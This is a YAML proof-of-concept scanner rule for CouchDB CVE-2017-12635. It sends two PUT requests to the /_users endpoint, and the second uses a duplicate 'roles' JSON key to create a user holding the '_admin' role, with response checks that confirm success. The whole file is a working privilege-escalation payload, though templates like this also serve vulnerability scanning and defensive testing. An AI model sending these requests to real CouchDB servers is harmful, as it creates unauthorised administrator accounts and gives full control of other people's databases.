name: poc-yaml-couchdb-cve-2017-12635
rules:
  - method: PUT
    path: '/_users/org.couchdb.user:zKpjpNMnmdpbTnkjB7CZvTecKT3JAjP8lHR'
    headers:
      Content-Length: '179'
      Content-Type: application/json
    body: |-
      {
        "type": "user",
        "name": "zKpjpNMnmdpbTnkjB7CZvTecKT3JAjP8lHR",
        "roles": ["_admin"],
        "password": "fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"
      }
    follow_redirects: false
    expression: |
      (status==403 && body.bcontains(b'forbidden')) || (status==409 && body.bcontains(b'conflict'))
  - method: PUT
    path: '/_users/org.couchdb.user:zKpjpNMnmdpbTnkjB7CZvTecKT3JAjP8lHR'
    headers:
      Content-Type: application/json
      Content-Length: '195'
    body: |-
      {
        "type": "user",
        "name": "zKpjpNMnmdpbTnkjB7CZvTecKT3JAjP8lHR",
        "roles": ["_admin"],
        "roles": [],
        "password": "fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"
      }
    follow_redirects: false
    expression: |
      (status==201 && body.bcontains(b'zKpjpNMnmdpbTnkjB7CZvTecKT3JAjP8lHR')) || (status==409 && body.bcontains(b'conflict'))
detail:
  author: j4ckzh0u(https://github.com/j4ckzh0u)
  links:
    - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635
